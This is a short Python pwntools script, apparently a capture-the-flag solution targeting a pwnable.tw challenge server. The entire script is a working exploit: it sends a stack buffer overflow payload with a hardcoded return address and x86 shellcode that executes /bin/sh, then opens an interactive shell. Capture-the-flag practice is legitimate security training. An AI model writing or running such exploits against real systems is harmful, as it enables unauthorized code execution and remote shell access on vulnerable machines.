from pwn import *

p = remote('chall.pwnable.tw', 10000)

payload = b''
payload += b'A'*20
payload += p32(0xffffd800)
payload += asm('''
    xor ecx, ecx
    mul ecx
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    mov al, 11
    int 0x80
''')

print(p.readline())
p.sendline(payload)
p.interactive()